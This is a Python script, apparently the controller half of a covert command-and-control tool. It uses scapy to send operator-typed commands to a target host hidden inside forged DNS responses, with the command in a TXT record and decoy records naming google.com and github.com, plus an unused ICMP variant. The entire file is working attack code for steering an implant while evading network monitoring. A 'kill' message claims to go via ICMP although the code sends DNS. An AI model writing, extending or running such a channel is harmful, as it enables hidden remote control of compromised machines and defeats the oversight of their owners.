#!/usr/bin/env python3

# start the program
# ask a user for an input command to the source
# send the command over in some encoded way
#   craft the packet
# wait for new command

from scapy.all import send, RandShort, get_if_list
from scapy.layers.inet import IP, ICMP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR

target = "0.0.0.0"  # this is a default value
protocol = "ICMP"


def makeICMPPacket(command):
    global target
    toBeSent = IP(dst=target) / ICMP(type=8) / command
    send(toBeSent, verbose=False)


def makeDNSPacket(command):
    global target
    query = DNS(
        qr=1,
        id=RandShort(),
        qd=DNSQR(qname="140.82.122.3", qtype="PTR"),
        an=[
            DNSRR(rrname="google.com", type="SOA", rdata="8.8.8.8"),
        ],
        ns=[
            DNSRR(rrname="github.com", type="TXT", rdata="command=" + command),
        ],
    )
    toBeSent = IP(dst=target) / UDP(sport=53, dport=54576) / query
    send(toBeSent, verbose=False)


# start program
def main() -> None:
    from sys import argv

    global target
    target = argv[1]
    while 1:
        command_input = str(input("Command input >> "))
        makeDNSPacket(command_input)
        if command_input == "kill":
            kill = input(
                "Sent kill via ICMP. Would you like to kill the server (y/N)? "
            )
            if kill.lower() == "y":
                return


if __name__ == "__main__":
    main()
